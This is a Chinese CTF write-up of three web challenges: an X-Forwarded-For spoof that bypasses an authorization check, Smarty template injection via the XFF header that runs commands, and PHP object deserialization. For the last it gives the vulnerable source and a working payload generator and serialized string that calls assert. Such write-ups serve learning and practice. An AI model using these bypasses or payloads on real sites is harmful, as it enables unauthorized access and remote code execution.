## [MRCTF2020]PYWebsite

打开是一个网页，要求输入授权码获取flag

![image-20210825111740395](https://i0.hdslb.com/bfs/album/e0735bcaf220bc8c73bda74cb18e298c51a3d145.png)

但是授权码要付款，但是付款是不可能付款的了

查看源码

![image-20210825111907764](https://i0.hdslb.com/bfs/album/03736764fd68e09c14505649168a0c7a2623cf65.png)

发现有一个flag.php。

打开看看

![image-20210825112007217](https://i0.hdslb.com/bfs/album/bb33a56c9482b3181978f2c67e6a74f15730bde2.png)

这里可以看到要获取flag是要验证授权码的，但是

这里说了除了购买者和自己，那不是可以用xff或者client-ip绕过吗？

直接xff。

![image-20210825112352045](https://i0.hdslb.com/bfs/album/93b9a5de4fe9da06f0453cd9a58b88be4108a446.png)

## [CISCN2019 华东南赛区]Web11

打开容器

![image-20210825112802960](https://i0.hdslb.com/bfs/album/aab2327b017bb513109474189634e6fb8519d149.png)

发现题目有提示到Build With Smarty，猜测是ssti类题目，又看到Xff。

直接试试

![image-20210825113046009](https://i0.hdslb.com/bfs/album/be028b552f41aa9494681de12128607d13584a99.png)

可以发现是ip是可控的

尝试执行命令

![image-20210825113212149](https://i0.hdslb.com/bfs/album/057725b232ee80eb5d1718a5a1a53f9f9251b1f7.png)

可以执行，但是没有发现flag

猜测在根目录下

![image-20210825113334181](https://i0.hdslb.com/bfs/album/ce8176b2ea59f3f16699e3ccfa988fbd19e4d947.png)

直接读取

![image-20210825113412479](https://i0.hdslb.com/bfs/album/33f3a3756d14cc71ecf4860ea12bc945a22e44c6.png)

## [NPUCTF2020]ReadlezPHP

<img src="https://i0.hdslb.com/bfs/album/74f72c3a6d128d36df869f285e7386708a995d7b.png" alt="image-20210825114037896" style="zoom: 50%;" />

查看源码

![image-20210825114214527](https://i0.hdslb.com/bfs/album/eddc604e99980744582f406ccdae612d6544945d.png)

发现了一个time.php

查看一下

拿到代码

```php
<?php
#error_reporting(0);
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this->a = "Y-m-d h:i:s";
        $this->b = "date";
    }
    public function __destruct(){
        $a = $this->a;
        $b = $this->b;
        echo $b($a);
    }
}
$c = new HelloPhp;

if(isset($_GET['source']))
{
    highlight_file(__FILE__);
    die(0);
}

@$ppp = unserialize($_GET["data"]);
```

看到unserialize，猜测是考反序列化

看到$b($a)，这里就是利用点了

尝试写函数

```php
<?php
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this->a = "phpinfo()";
        $this->b = "system";
    }

}
$c = new HelloPhp();

echo serialize($c);
?>
```

但是system函数好像被ban了。

但是我们可以改用assert函数

```php
<?php
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this->a = "phpinfo()";
        $this->b = "assert";
    }

}
$c = new HelloPhp();

echo serialize($c);
?>//O:8:"HelloPhp":2:{s:1:"a";s:9:"phpinfo()";s:1:"b";s:6:"assert";}
```

![image-20210825115542802](https://i0.hdslb.com/bfs/album/56c48da3d17dbb5521da0a7651aee624a415bb63.png)

执行成功，发现flag居然phpinfo里面

![image-20210825115705894](https://i0.hdslb.com/bfs/album/da4cbf9897255fe410278d1a5adf0fa47044107a.png)

